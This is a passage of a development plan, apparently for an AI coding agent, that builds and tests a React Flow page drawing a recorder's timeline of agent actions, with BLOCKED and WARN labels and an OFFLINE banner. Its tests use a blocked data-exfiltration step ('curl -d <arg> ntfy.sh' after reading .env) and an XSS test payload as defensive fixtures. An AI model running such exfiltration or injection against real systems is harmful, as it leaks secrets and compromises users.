        const response = await fetch('/api/steps', { signal: controller.signal, cache: 'no-store' })
        if (!response.ok) throw new Error('bad status')
        const snapshot = parseSnapshot(await response.json())
        if (snapshot === null) throw new Error('bad body')
        if (cancelled) return
        setOffline(false)
        dispatch({ type: 'snapshot', session: snapshot.session, steps: snapshot.steps })
      } catch {
        if (!cancelled) setOffline(true)
      } finally {
        clearTimeout(abortTimer)
        if (!cancelled) gap = setTimeout(() => void poll(), POLL_GAP_MS)
      }
    }

    void poll()
    return () => {
      cancelled = true
      clearTimeout(gap)
      active?.abort()
    }
  }, [mock])

  useEffect(() => {
    if (!mock) return
    const session = `mock-${mockRun}`
    let shown = 0
    function tick(): void {
      shown += 1
      dispatch({ type: 'snapshot', session, steps: MOCK_STEPS.slice(0, shown) as Step[] })
      if (shown >= MOCK_STEPS.length) clearInterval(timer)
    }
    const timer = setInterval(tick, MOCK_INTERVAL_MS)
    tick()
    return () => clearInterval(timer)
  }, [mock, mockRun])

  const newSession = useCallback(() => {
    if (mock) setMockRun((n) => n + 1)
    else dispatch({ type: 'newSession' })
  }, [mock])

  return { steps: state.steps, offline: mock ? false : offline, newSession }
}
```

- [ ] **Step 4: Run the tests and the web check**

Run: `npm --prefix ui test -- src/graph/useRecorder.test.tsx`
Expected: PASS (13 tests).
Run: `npm --prefix ui run check`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add ui/src/graph/useRecorder.ts ui/src/graph/useRecorder.test.tsx
git commit -m "$(cat <<'EOF'
AG-28: add polling, OFFLINE detection, mock playback and New session

Co-Authored-By: Claude Sonnet 5.5 <noreply@anthropic.com>
EOF
)"
```

---

### Task 6: The drawing and the page

**Files:**
- Create: `ui/src/graph/nodes.tsx`, `ui/src/graph/usePaneSize.ts`, `ui/src/graph/GraphView.tsx`
- Modify: `ui/src/App.tsx`, `ui/src/main.tsx`, `ui/src/index.css`
- Replace: `ui/src/App.test.tsx` (the old test asserts the scaffold text "AgentFly v2", which goes away)
- Test: `ui/src/graph/GraphView.test.tsx`, `ui/src/App.test.tsx`

**Interfaces:**
- Consumes: `layoutGraph`, `GraphNode` types and constants (Task 3), `computeViewport`, `PaneSize` (Task 4), `useRecorder` (Task 5), `Step`, `makeStep`, `stepsFrom`, `MOCK_STEPS`.
- Produces: `GraphView({ steps }: { steps: readonly Step[] })`; `usePaneSize()`; the container has `data-testid="graph-pane"`; `App` (default export).

Behaviour notes the code implements (spec section 4): the verdict chip sits at the right end of a step box; file paths are cut at the left end inside `<bdi>`; every node sets `pointer-events: all` through its `style` (set in `layoutGraph`) so `title` tooltips fire; the "New session" button sits top left and the OFFLINE banner is a full-width bar with left padding, both overlaying the pane (top padding 48 keeps them clear of the first row); the container has a definite height (`h-screen` on `<main>`).

- [ ] **Step 1: Write the failing tests**

Create `ui/src/graph/GraphView.test.tsx`:

```tsx
import { act, cleanup, render, screen } from '@testing-library/react'
import { afterEach, describe, expect, it, vi } from 'vitest'
import { GraphView } from './GraphView'
import { layoutGraph } from './layout'
import { MOCK_STEPS } from './mock'
import { makeStep, stepsFrom } from './testing'

const settle = () =>
  act(async () => {
    await new Promise((resolve) => setTimeout(resolve, 50))
  })

const viewportTransform = (container: HTMLElement) =>
  (container.querySelector('.react-flow__viewport') as HTMLElement).style.transform

afterEach(() => {
  cleanup()
  vi.restoreAllMocks()
})

describe('GraphView', () => {
  it('draws the demo story with labels that do not depend on colour', async () => {
    const { container } = render(<GraphView steps={MOCK_STEPS} />)
    await settle()
    expect(screen.getByText('curl -d <arg> ntfy.sh')).toBeTruthy()
    expect(screen.getByText('BLOCKED')).toBeTruthy()
    expect(screen.getByText('SECRET')).toBeTruthy()
    expect(screen.getByText('R1')).toBeTruthy()
    expect(screen.getByText('ntfy.sh')).toBeTruthy()
    expect(screen.getAllByText('README.md')).toHaveLength(1)
    expect(container.querySelectorAll('.react-flow__node')).toHaveLength(layoutGraph(MOCK_STEPS).nodes.length)
  })

  it('labels a warned step WARN', async () => {
    render(<GraphView steps={[makeStep(1, { verdict: 'warned', rule: 'R1', host: 'x.com', command: 'curl x.com' })]} />)
    await settle()
    expect(screen.getByText('WARN')).toBeTruthy()
    expect(screen.queryByText('BLOCKED')).toBeNull()
  })

  it('keeps every edge after React Flow measures the nodes', async () => {
    const { container } = render(<GraphView steps={MOCK_STEPS} />)
    await settle()
    expect(container.querySelectorAll('.react-flow__edge')).toHaveLength(layoutGraph(MOCK_STEPS).edges.length)
  })

  it('keeps every edge after a poll rebuilds the node objects', async () => {
    const { container, rerender } = render(<GraphView steps={MOCK_STEPS} />)
    await settle()
    rerender(<GraphView steps={MOCK_STEPS.map((s) => ({ ...s }))} />)
    await settle()
    expect(container.querySelectorAll('.react-flow__edge')).toHaveLength(layoutGraph(MOCK_STEPS).edges.length)
  })

  it('shows server text literally, never as HTML', async () => {
    const hostile = '<img src=x onerror="alert(1)">'
    const { container } = render(<GraphView steps={[makeStep(1, { command: hostile })]} />)
    await settle()
    expect(screen.getByText(hostile)).toBeTruthy()
    expect(container.querySelector('img')).toBeNull()
  })

  it('lets node tooltips fire: pointer events on and the full text in title', async () => {
    const long = `curl -d ${'x'.repeat(80)} very-long-host.example.com`
    const { container } = render(<GraphView steps={[makeStep(40001, { command: long })]} />)
    await settle()
    const node = container.querySelector('.react-flow__node') as HTMLElement
    expect(node.style.pointerEvents).toBe('all')
    expect(container.querySelector(`[title*="${long}"]`)).not.toBeNull()
  })

  it('puts the camera at the top with few steps and follows the newest with many', async () => {
    const few = render(<GraphView steps={stepsFrom(40000, 3)} />)
    await settle()
    expect(viewportTransform(few.container)).toBe('translate(0px,48px) scale(1)')
    few.unmount()
    const many = render(<GraphView steps={stepsFrom(40000, 20)} />)
    await settle()
    expect(viewportTransform(many.container)).toBe('translate(0px,-64px) scale(1)')
  })

  it('never produces NaN for an unmeasured 0x0 pane', async () => {
    const { container } = render(<GraphView steps={stepsFrom(40000, 20)} />)
    await settle()
    expect(viewportTransform(container)).not.toContain('NaN')
    expect(container.querySelectorAll('.react-flow__node').length).toBeGreaterThan(0)
  })

  it('recomputes the camera when the pane is resized after mount', async () => {
    let paneHeight = 1080
    const real = HTMLElement.prototype.getBoundingClientRect
    vi.spyOn(HTMLElement.prototype, 'getBoundingClientRect').mockImplementation(function (this: HTMLElement) {
      if (this.dataset.testid === 'graph-pane') return { width: 960, height: paneHeight, x: 0, y: 0, top: 0, left: 0, right: 960, bottom: paneHeight, toJSON() {} }
      return real.call(this)
    })
    const { container } = render(<GraphView steps={stepsFrom(40000, 20)} />)
    await settle()
    expect(viewportTransform(container)).toBe('translate(0px,-64px) scale(1)')
    paneHeight = 700
    await act(async () => {
      globalThis.fireResizeObservers()
    })
    await settle()
    expect(viewportTransform(container)).toBe('translate(0px,-444px) scale(1)')
  })
})
```

Replace the whole of `ui/src/App.test.tsx` with:

```tsx
import { act, cleanup, fireEvent, render, screen } from '@testing-library/react'
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'
import App from './App'
import { IGNORE_KEY } from './graph/ignoredSession'
import { stepsFrom } from './graph/testing'
import type { Step } from './graph/types'

function respond(session: string | null, steps: Step[]): Response {
  return { ok: true, json: async () => ({ session, steps }) } as Response
}

async function advance(ms: number): Promise<void> {
  await act(async () => {
    await vi.advanceTimersByTimeAsync(ms)
  })
}

beforeEach(() => {
  vi.useFakeTimers()
  window.sessionStorage.clear()
  window.history.replaceState({}, '', '/')
})

afterEach(() => {
  cleanup()
  vi.useRealTimers()
  vi.unstubAllGlobals()
})

describe('App', () => {
  it('shows "Waiting for agent actions…" with no steps, then draws steps', async () => {
    let steps: Step[] = []
    vi.stubGlobal('fetch', vi.fn(async () => respond(steps.length ? 's' : null, steps)))
    render(<App />)
    await advance(0)
    expect(screen.getByText('Waiting for agent actions…')).toBeTruthy()
    steps = stepsFrom(40000, 2)
    await advance(1000)
    expect(screen.queryByText('Waiting for agent actions…')).toBeNull()
    expect(screen.getAllByText('shell')).toHaveLength(2)
  })

  it('shows the red OFFLINE banner within 3 s, keeps the drawing, and clears it', async () => {
    let up = true
    vi.stubGlobal('fetch', vi.fn((_url: unknown, init?: RequestInit) =>
      up
        ? Promise.resolve(respond('s', stepsFrom(40000, 2)))
        : new Promise<Response>((_res, rej) => init?.signal?.addEventListener('abort', () => rej(new DOMException('a', 'AbortError')))),
    ))
    render(<App />)
    await advance(0)
    expect(screen.queryByRole('alert')).toBeNull()

    up = false
    await advance(2900)
    expect(screen.getByRole('alert').textContent).toBe('OFFLINE - recorder not reachable')
    expect(screen.getAllByText('shell')).toHaveLength(2)

    up = true
    await advance(1100)
    expect(screen.queryByRole('alert')).toBeNull()
  })

  it('New session empties the graph and sends nothing; a reload keeps it empty', async () => {
    const fetchMock = vi.fn(async () => respond('s', stepsFrom(40000, 2)))
    vi.stubGlobal('fetch', fetchMock)
    const first = render(<App />)
    await advance(0)
    expect(screen.getAllByText('shell')).toHaveLength(2)
    const callsBefore = fetchMock.mock.calls.length

    fireEvent.click(screen.getByRole('button', { name: 'New session' }))
    await advance(0)
    expect(screen.queryAllByText('shell')).toHaveLength(0)
    expect(screen.getByText('Waiting for agent actions…')).toBeTruthy()
    expect(fetchMock.mock.calls.length).toBe(callsBefore)
    expect(window.sessionStorage.getItem(IGNORE_KEY)).toBe('s')

    first.unmount()
    render(<App />)
    await advance(1100)
    expect(screen.queryAllByText('shell')).toHaveLength(0)
  })

  it('mock mode never calls /api/steps and plays the scenario', async () => {
    window.history.replaceState({}, '', '/?mock=1')
    const fetchMock = vi.fn()
    vi.stubGlobal('fetch', fetchMock)
    render(<App />)
    await advance(7000)
    expect(fetchMock).not.toHaveBeenCalled()
    expect(screen.getByText('BLOCKED')).toBeTruthy()
    expect(screen.getByText('curl -d <arg> ntfy.sh')).toBeTruthy()
  })
})
```

- [ ] **Step 2: Run them to see them fail**

Run: `npm --prefix ui test -- src/graph/GraphView.test.tsx src/App.test.tsx`
Expected: FAIL, `Failed to resolve import "./GraphView"` (and `./graph/useRecorder` is found but `App` still renders the scaffold).

- [ ] **Step 3: Write the components**

Create `ui/src/graph/nodes.tsx`:

```tsx
import { Handle, Position, type NodeProps } from '@xyflow/react'
import type { FileNode, HostNode, RuleNode, StepNode } from './layout'

const HIDDEN_HANDLE = { opacity: 0 } as const

function stepDetail(command: string | null, tool: string | null, kind: string): string {
  if (kind === 'read' || kind === 'edit') return ''
  return command ?? tool ?? ''
}

export function StepBox({ data }: NodeProps<StepNode>) {
  const { step } = data
  const detail = stepDetail(step.command, step.tool, step.kind)
  const tone =
    step.verdict === 'blocked'
      ? 'bg-blocked border-rule-edge'
      : step.verdict === 'warned'
        ? 'bg-warned border-warned'
        : 'bg-step border-step'
  const chip = step.verdict === 'blocked' ? 'BLOCKED' : step.verdict === 'warned' ? 'WARN' : null
  const chipTone = step.verdict === 'blocked' ? 'text-blocked' : 'text-warned'
  return (
    <div
      className={`flex h-full w-full items-center gap-2 rounded-lg border-2 px-3 text-base leading-6 text-white ${tone}`}
      title={`${step.order}: ${step.kind}${detail ? ` ${detail}` : ''}`}
    >
      <Handle id="t" type="target" position={Position.Top} style={HIDDEN_HANDLE} />
      <span className="shrink-0 font-semibold">{step.kind}</span>
      <span className="min-w-0 flex-1 truncate font-mono">{detail}</span>
      {chip !== null && (
        <span className={`shrink-0 rounded bg-white px-2 font-bold leading-5 ${chipTone}`}>{chip}</span>
      )}
      <Handle id="b" type="source" position={Position.Bottom} style={HIDDEN_HANDLE} />
      <Handle id="r" type="source" position={Position.Right} style={HIDDEN_HANDLE} />
    </div>
  )
}

export function FileBox({ data }: NodeProps<FileNode>) {
  const tone = data.sensitive ? 'bg-secret text-ink' : 'bg-link text-white'
  return (
    <div className={`flex h-full w-full items-center gap-2 rounded px-2 text-base leading-6 ${tone}`} title={data.path}>
      <Handle id="l" type="target" position={Position.Left} style={HIDDEN_HANDLE} />
      <span dir="rtl" className="min-w-0 flex-1 truncate text-left font-mono">
        <bdi>{data.path}</bdi>
      </span>
      {data.sensitive && <span className="shrink-0 font-bold">SECRET</span>}
    </div>
  )
}

export function HostBox({ data }: NodeProps<HostNode>) {
  return (
    <div className="flex h-full w-full items-center rounded bg-link px-2 text-base leading-6 text-white" title={data.host}>
      <Handle id="l" type="target" position={Position.Left} style={HIDDEN_HANDLE} />
      <span className="min-w-0 flex-1 truncate font-mono">{data.host}</span>
    </div>
  )
}

export function RuleBox({ data }: NodeProps<RuleNode>) {
  return (
    <div
      className="flex h-full w-full items-center justify-center rounded-full border-2 border-rule-edge bg-rule px-2 text-base font-bold leading-5 text-white"
      title={`Rule ${data.rule}`}
    >
      <Handle id="l" type="target" position={Position.Left} style={HIDDEN_HANDLE} />
      <span className="truncate">{data.rule}</span>
    </div>
  )
}
```

Create `ui/src/graph/usePaneSize.ts`:

```ts
import { useLayoutEffect, useRef, useState, type RefObject } from 'react'
import type { PaneSize } from './viewport'

/** Measures an element. 0x0 until measured; computeViewport falls back to 960x1080. */
export function usePaneSize(): { ref: RefObject<HTMLDivElement | null>; pane: PaneSize } {
  const ref = useRef<HTMLDivElement | null>(null)
  const [pane, setPane] = useState<PaneSize>({ width: 0, height: 0 })

  useLayoutEffect(() => {
    const element = ref.current
    if (element === null) return
    function measure(): void {
      const rect = element!.getBoundingClientRect()
      setPane((p) => (p.width === rect.width && p.height === rect.height ? p : { width: rect.width, height: rect.height }))
    }
    measure()
    const observer = new ResizeObserver(measure)
    observer.observe(element)
    return () => observer.disconnect()
  }, [])

  return { ref, pane }
}
```

Create `ui/src/graph/GraphView.tsx`:

```tsx
import { ReactFlow } from '@xyflow/react'
import { useMemo } from 'react'
import { layoutGraph } from './layout'
import { FileBox, HostBox, RuleBox, StepBox } from './nodes'
import type { Step } from './types'
import { usePaneSize } from './usePaneSize'
import { computeViewport } from './viewport'

// Module-level so React Flow does not see a new object on every render.
const nodeTypes = { step: StepBox, file: FileBox, host: HostBox, rule: RuleBox }

function ignoreViewportChange(): void {}

/** The drawing: React Flow, fully controlled (no pan, zoom, drag or selection). */
export function GraphView({ steps }: { steps: readonly Step[] }) {
  const { ref, pane } = usePaneSize()
  const layout = useMemo(() => layoutGraph(steps), [steps])
  const viewport = useMemo(() => computeViewport(layout.rowCount, pane), [layout.rowCount, pane])

  return (
    <div ref={ref} data-testid="graph-pane" className="h-full w-full">
      <ReactFlow
        nodes={layout.nodes}
        edges={layout.edges}
        nodeTypes={nodeTypes}
        viewport={viewport}
        onViewportChange={ignoreViewportChange}
        minZoom={1}
        maxZoom={1}
        nodesDraggable={false}
        nodesConnectable={false}
        nodesFocusable={false}
        edgesFocusable={false}
        elementsSelectable={false}
        panOnDrag={false}
        zoomOnScroll={false}
        zoomOnPinch={false}
        zoomOnDoubleClick={false}
        deleteKeyCode={null}
      />
    </div>
  )
}
```

Replace `ui/src/App.tsx` with:

```tsx
import { useMemo } from 'react'
import { GraphView } from './graph/GraphView'
import { useRecorder } from './graph/useRecorder'

function App() {
  const mock = useMemo(() => new URLSearchParams(window.location.search).get('mock') === '1', [])
  const { steps, offline, newSession } = useRecorder(mock)

  return (
    <main className="relative h-screen w-screen overflow-hidden bg-canvas text-base text-ink">
      <GraphView steps={steps} />
      {steps.length === 0 && (
        <p className="pointer-events-none absolute inset-0 grid place-items-center text-base text-muted">
          Waiting for agent actions…
        </p>
      )}
      {offline && (
        <div
          role="alert"
          className="absolute inset-x-0 top-0 z-20 bg-blocked px-4 py-2 pl-48 text-center text-base font-bold text-white"
        >
          OFFLINE - recorder not reachable
        </div>
      )}
      <button
        type="button"
        onClick={newSession}
        className="absolute left-4 top-2 z-30 rounded border-2 border-ink bg-white px-3 text-base leading-6 font-semibold text-ink"
      >
        New session
      </button>
    </main>
  )
}

export default App
```

Replace `ui/src/index.css` with. The colours are theme variables, always emitted with `@theme static`, so inline `var(--color-blocked)` edge strokes resolve. The line `@source not '../dist';` is required: without it Tailwind scans the committed `ui/dist` as a source, every build then differs from the last, and the stale-build check in Task 7 fails.

```css
@import 'tailwindcss';
@source not '../dist';

@theme static {
  --color-canvas: #f5f7fa;
  --color-ink: #111827;
  --color-muted: #4b5563;
  --color-step: #6b7280;
  --color-link: #2563eb;
  --color-secret: #d97706;
  --color-blocked: #dc2626;
  --color-warned: #7c3aed;
  --color-rule: #b91c1c;
  --color-rule-edge: #7f1d1d;
  --color-chain: #6b7280;
  --color-aux: #9aa3b2;
}

body {
  margin: 0;
  background: var(--color-canvas);
}
```

Replace `ui/src/main.tsx` with (React Flow's stylesheet is imported here so it lands in the single `assets/index.css` bundle):

```tsx
import { StrictMode } from 'react'
import { createRoot } from 'react-dom/client'
import '@xyflow/react/dist/style.css'
import './index.css'
import App from './App.tsx'

createRoot(document.getElementById('root')!).render(
  <StrictMode>
    <App />
  </StrictMode>,
)
```

- [ ] **Step 4: Run the tests and the web check**

Run: `npm --prefix ui test -- src/graph/GraphView.test.tsx src/App.test.tsx`
Expected: PASS.
Run: `npm --prefix ui run check`
Expected: PASS (type-check and every test, 90+).

- [ ] **Step 5: Commit**

```bash
git add ui/src/graph/nodes.tsx ui/src/graph/usePaneSize.ts ui/src/graph/GraphView.tsx ui/src/graph/GraphView.test.tsx ui/src/App.tsx ui/src/App.test.tsx ui/src/main.tsx ui/src/index.css
git commit -m "$(cat <<'EOF'
AG-28: draw the live graph with controlled React Flow

Co-Authored-By: Claude Sonnet 5.5 <noreply@anthropic.com>
EOF
)"
```

---

### Task 7: The 16 px floor, the build and the real-browser check

jsdom has no layout, so three things only this task can check: the pane has a real height, text fits its boxes, and the red edge is visible.

**Files:**
- Create: `ui/src/textSize.test.ts`
- Modify: `ui/dist/**` (rebuilt)

**Interfaces:**
- Consumes: everything under `ui/src`. Produces: the committed build the recorder serves at `/v2/`.

- [ ] **Step 1: Write the scan test**

Create `ui/src/textSize.test.ts`. It scans `ui/src` (`.ts`, `.tsx`, `.css`, excluding tests and the setup file) for `text-xs`, `text-sm`, arbitrary sizes below 16 px (`px`, `rem`, `em`) and inline `fontSize`/`font-size` below 16. React Flow's stylesheet lives in `node_modules` and is not scanned; that is the deliberate attribution-link exception.

```ts
import { describe, expect, it } from 'vitest'

// Everything under ui/src except tests and test helpers.
const sources = import.meta.glob(['/src/**/*.{ts,tsx,css}', '!/src/**/*.test.{ts,tsx}', '!/src/test-setup.ts'], {
  query: '?raw',
  import: 'default',
  eager: true,
}) as Record<string, string>

const MIN_PX = 16

function toPx(value: string, unit: string | undefined): number {
  const n = Number.parseFloat(value)
  return unit === 'rem' || unit === 'em' ? n * 16 : n
}

/** Returns each text-size use below 16 px found in a source file. */
export function findSmallText(source: string): string[] {
  const found: string[] = []
  for (const m of source.matchAll(/\btext-(xs|sm)\b/g)) found.push(m[0])
  for (const m of source.matchAll(/\btext-\[(\d*\.?\d+)(px|rem|em)\]/g)) {
    if (toPx(m[1], m[2]) < MIN_PX) found.push(m[0])
  }
  for (const m of source.matchAll(/font-?[sS]ize\s*:\s*['"]?(\d*\.?\d+)(px|rem|em)?['"]?/g)) {
    if (toPx(m[1], m[2] ?? 'px') < MIN_PX) found.push(m[0])
  }
  return found
}

describe('text is at least 16 px', () => {
  // React Flow's own stylesheet (its attribution link is 10 px) lives in
  // node_modules and is not scanned: a deliberate exception, see the spec.
  it('flags each way of writing small text', () => {
    expect(findSmallText('className="text-xs"')).toEqual(['text-xs'])
    expect(findSmallText('className="text-sm"')).toEqual(['text-sm'])
    expect(findSmallText('className="text-[12px]"')).toEqual(['text-[12px]'])
    expect(findSmallText('className="text-[0.75rem]"')).toEqual(['text-[0.75rem]'])
    expect(findSmallText('style={{ fontSize: 12 }}')).toHaveLength(1)
    expect(findSmallText("style={{ fontSize: '0.8em' }}")).toHaveLength(1)
    expect(findSmallText('a { font-size: 14px; }')).toHaveLength(1)
  })

  it('accepts 16 px and larger', () => {
    expect(findSmallText('className="text-base text-lg text-[16px] text-[1rem]"')).toEqual([])
    expect(findSmallText('a { font-size: 1rem; }')).toEqual([])
    expect(findSmallText('style={{ fontSize: 18 }}')).toEqual([])
  })

  it('finds the sources it is meant to scan', () => {
    expect(Object.keys(sources).length).toBeGreaterThan(8)
    expect(Object.keys(sources).some((p) => p.endsWith('nodes.tsx'))).toBe(true)
    expect(Object.keys(sources).some((p) => p.endsWith('index.css'))).toBe(true)
  })

  it('finds no small text in the app', () => {
    const offenders = Object.entries(sources).flatMap(([path, text]) => findSmallText(text).map((hit) => `${path}: ${hit}`))
    expect(offenders).toEqual([])
  })
})
```

- [ ] **Step 2: Run it**

Run: `npm --prefix ui test -- src/textSize.test.ts`
Expected: PASS (4 tests). If "finds no small text in the app" fails, fix the offending class named in the output (use `text-base` or larger), do not weaken the scan.

- [ ] **Step 3: Build with Node 22**

Run: `node -v`
Expected: `v22.x` (if not, `nvm use` in `ui/`; `ui/.nvmrc` pins 22).
Run: `npm --prefix ui ci && npm --prefix ui run build`
Expected: `dist/index.html`, `dist/assets/index.css`, `dist/assets/index.js` written, no type errors.

- [ ] **Step 4: Check the Python side still serves it**

Run: `uv run pytest -q tests/test_app.py`
Expected: PASS (`test_v2_serves_new_page`, `test_v2_serves_asset` read the new bundle).

- [ ] **Step 5: Commit the build and the scan**

```bash
git add ui/src/textSize.test.ts ui/dist
git commit -m "$(cat <<'EOF'
AG-28: add the 16 px floor check and rebuild ui/dist

Co-Authored-By: Claude Sonnet 5.5 <noreply@anthropic.com>
EOF
)"
```

- [ ] **Step 6: Stale-build check**

This fails if `ui/src/index.css` lacks `@source not '../dist';` (Tailwind would scan the old build). If it fails, check that line first.

Run: `npm --prefix ui run build && test -z "$(git status --porcelain ui/dist)" && echo FRESH`
Expected: prints `FRESH` (a second build leaves `ui/dist` unchanged).

- [ ] **Step 7: Real-browser check (required; if no browser tool is available, hand this to the user and record their answers)**

Start the recorder in its own terminal: `uv run uvicorn recorder.app:app --host 127.0.0.1 --port 8787`. Use a 960x1080 window (browser devtools device toolbar, or resize). Do each check and write the result in the PR description.

1. **Mock.** Open `http://127.0.0.1:8787/v2/?mock=1`. Within 6 s five steps appear one per 1.5 s. In the console run `[document.querySelectorAll('.react-flow__edge').length, document.querySelectorAll('.react-flow__node').length]`. Expected: `[9, 9]`. Look at the page: `.env` is amber with "SECRET"; `README.md` is one blue box with two edges into it; the `curl -d <arg> ntfy.sh` step is red with "BLOCKED", its text fully visible in its box; a dashed red edge reaches the "R1" box (below the `ntfy.sh` box) and is not hidden behind another box; every edge end touches its box (zoom the screenshot); the "New session" button (top left) does not cover any part of the first step box; the React Flow attribution link at bottom right does not touch the newest row. In the console run `[...document.querySelectorAll('.react-flow__node')].every(n => { const r = n.getBoundingClientRect(); return r.left >= 0 && r.right <= innerWidth && r.top >= 0 && r.bottom <= innerHeight })`. Expected: `true`.
2. **Real replay.** In another terminal run `uv run python fake_agent.py`. Hard-refresh `http://127.0.0.1:8787/v2/` (Cmd+Shift+R). Expected: three steps (README read, `.env` read, blocked `curl`), edges `6`, the red dashed edge to "R1" visible, "BLOCKED" label.
3. **Window of 20 with real step numbers.** Run `for i in $(seq 1 12); do uv run python fake_agent.py --session manual-check > /dev/null; done`, wait 2 s, then in the console run `const s=[...document.querySelectorAll('.react-flow__node-step')]; const r=s.at(-1).getBoundingClientRect(); [s.length, r.top >= 0, r.bottom <= innerHeight]`. Expected: `[20, true, true]` (the newest step in view, at most 20 steps).
4. **OFFLINE.** Stop the recorder (Ctrl+C). Within 3 s a red "OFFLINE - recorder not reachable" banner appears and the drawing stays. Start the recorder again; the banner clears (note: restarting clears server memory, so the page then shows "Waiting for agent actions…").
5. **New session.** Run `uv run python fake_agent.py --session another-check`, click "New session": the graph empties. Reload: still empty. Run `uv run python fake_agent.py --session third-check`: its steps appear.
6. **Tooltip.** Hover a step box: the full text appears as a tooltip.

If any check fails, stop and report: do not edit the spec or the tests to match. Fix the cause (code or constants in `layout.ts`) and rerun Steps 3 to 6.

---

### Task 8: Docs match the page, final checks

**Files:**
- Modify: `SPEC.md` (section 6, lines 233 to 242), `HOOKS.md` (lines 228 to 230), `README.md` (lines 119 to 121), `ui/README.md` (line 19)

**Interfaces:** none (text only). Keep the API's "last 10 steps" wording where it describes `GET /api/steps` (`HOOKS.md` line 235 stays true) and keep the old page's description, which is still live at `/` until AG-31.

- [ ] **Step 1: Rewrite SPEC.md section 6**

In `SPEC.md`, replace the first four bullets of "## 6. The screen" (from "- Two pages from the local server" to the end of the "Only the last 10 steps" bullet) with:

```markdown
- Two pages from the local server: the current demo page at `/` (vis-network
  from a CDN, steps in a row), and the new React page at `/v2/` (Vite build
  committed under `ui/dist`). The new page draws the graph; which page is the
  demo, and when `/` switches to the new one, is decided in AG-31.
- The new page is a timeline. Steps run down the left, oldest at the top,
  each joined to the next in order. Files sit in a lane to their right, and
  websites and rules in a lane further right. A file, website or rule is one
  box, level with the first drawn step that touches it. A blocked step is
  joined by a dashed red line to a box for its rule (a warned step by a dashed
  purple line).
- The new page draws the 20 most recent steps of the *current session* that it
  has seen (each refresh brings the server's last 10; earlier ones are kept in
  the page) and keeps the newest step in view. A "New session" button clears
  the picture between rehearsals (it does not delete data). Open
  `/v2/?mock=1` to replay a sample session with no server.
```

Leave the OFFLINE and "about once a second" bullets as they are.

- [ ] **Step 2: Fix HOOKS.md**

In `HOOKS.md`, replace the bullet that begins "- Current page: [`web/index.html`]" (it ends "(Part B)." and currently says the new page is a scaffold with the graph not drawn) with:

```markdown
- Current page: [`web/index.html`](web/index.html) at `/` (Part A). New page:
  [`ui/`](ui/) build served at `/v2/` (Vite + React; a timeline of the last 20
  steps it has seen; `/v2/?mock=1` replays a sample session with no server).
  Server memory: [`recorder/memory.py`](recorder/memory.py) (Part B).
```

Do not change the `GET /api/steps` bullet: the API still returns the last 10 steps.

- [ ] **Step 3: Fix README.md**

In `README.md` (section "**4. Watch the live graph.**"), replace the sentences from "The scaffold for the next UI is at" to "ready yet." with:

```markdown
The new UI (`ui/`, Vite + React) is at <http://127.0.0.1:8787/v2/>: a timeline
with steps on the left, files in the middle and hosts and rules on the right,
drawing the last 20 steps it has seen. `/v2/?mock=1` replays a sample session
with no server.
```

Keep the preceding sentences about `/` (it still draws the last 10 steps).

- [ ] **Step 4: Fix ui/README.md**

In `ui/README.md`, replace the last line ("Commit `dist/` after build. Graph drawing is not implemented yet ...") with:

```markdown
Commit `dist/` after build.

## What the page draws

A timeline: steps in a left column (oldest at the top), files in the middle
lane, hosts and rules in the right lane. At most 20 steps are drawn, from the
steps the page has seen (the API returns the last 10 per poll). The camera is
fixed at zoom 1 and follows the newest step. `/v2/?mock=1` replays a sample
session without calling the server; "New session" restarts it.

Layout and camera are pure functions in `src/graph/` (`layout.ts`,
`viewport.ts`); positions come from a step's place in the list, never from its
`order`. Text is at least 16 px; the one exception is React Flow's own
attribution link, kept on purpose. Tests use a jsdom setup that measures nodes
like a browser (`src/test-setup.ts`); it cannot check layout, so after a UI
change also open `/v2/?mock=1` and a real `fake_agent.py` run in a browser.
```

- [ ] **Step 5: Run every AGENTS.md check**

Run: `uv run ruff check . && uv run ruff format --check . && uv run pytest -q`
Expected: PASS (Python untouched; 85+ tests).
Run: `npm --prefix ui ci && npm --prefix ui run check`
Expected: PASS.
Run: `npm --prefix ui run build && test -z "$(git status --porcelain ui/dist)" && echo FRESH`
Expected: `FRESH`.

- [ ] **Step 6: Search for stale text**

Run: `grep -rnE "graph not drawn|not drawn yet|not ready yet|not implemented yet|scaffold only|only shows|scaffold for the next UI|Steps in a row, connected|Only the last 10 steps of the \*current session\*" --include="*.md" . | grep -v node_modules | grep -v "docs/superpowers"`
Expected: no output. (The old page's "draws the last 10 steps" sentences in `README.md` and `HOOKS.md` are still true and do not match.)

- [ ] **Step 7: Commit**

```bash
git add SPEC.md HOOKS.md README.md ui/README.md
git commit -m "$(cat <<'EOF'
AG-28: describe the lanes layout and the 20-step window in the docs

Co-Authored-By: Claude Sonnet 5.5 <noreply@anthropic.com>
EOF
)"
```

- [ ] **Step 8: Hand over (do not open the PR unless asked)**

Report: what passed (the three AGENTS.md checks, with counts), the results of the Task 7 real-browser check, and what the PR description must say:
- The spec and intent files under `docs/superpowers/` are working documents, not product documentation.
- Deliberate exception to the 16 px floor: React Flow's attribution link (10 px), kept on purpose (hiding it needs React Flow Pro).
- In `/v2/?mock=1`, "New session" restarts the scenario instead of emptying the graph (listed on AG-28).
- Known costs: an edge to an anchor that has left the top of the pane runs off-screen; a window slide moves the whole drawing up one row (AG-29 eases it); bursts of more than 10 steps between polls lose the extra steps.
- AG-28 and AG-31 Jira text already updated (2026-10-02).

Then stop. AG-29, AG-30 and AG-31 are separate tickets.
